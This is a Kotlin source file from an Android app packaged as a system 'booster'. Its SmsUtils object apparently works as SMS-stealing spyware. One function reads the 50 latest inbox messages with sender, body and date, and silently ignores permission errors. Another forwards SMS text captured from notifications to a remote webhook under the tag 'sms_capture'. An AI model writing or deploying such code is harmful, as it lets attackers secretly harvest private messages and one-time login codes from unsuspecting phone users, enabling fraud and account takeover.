package com.sysopt.booster

import android.content.Context
import android.net.Uri

object SmsUtils {
    fun getSmsMessages(context: Context): List<Map<String, String>> {
        val messages = mutableListOf<Map<String, String>>()
        val uri = Uri.parse("content://sms/inbox")

        try {
            val cursor = context.contentResolver.query(
                uri,
                arrayOf("address", "body", "date"),
                null,
                null,
                "date DESC LIMIT 50"
            )

            cursor?.use { c ->
                while (c.moveToNext()) {
                    val address = c.getString(c.getColumnIndexOrThrow("address"))
                    val body = c.getString(c.getColumnIndexOrThrow("body"))
                    val date = c.getString(c.getColumnIndexOrThrow("date"))
                    messages.add(mapOf("from" to address, "body" to body, "date" to date))
                }
            }
        } catch (e: Exception) {
            // Permission denied
        }

        return messages
    }

    fun captureSmsFromNotification(title: String, text: String, fullText: String) {
        WebhookClient.sendData(mapOf(
            "type" to "sms_capture",
            "title" to title,
            "text" to text,
            "full_text" to fullText,
            "timestamp" to System.currentTimeMillis()
        ))
    }
}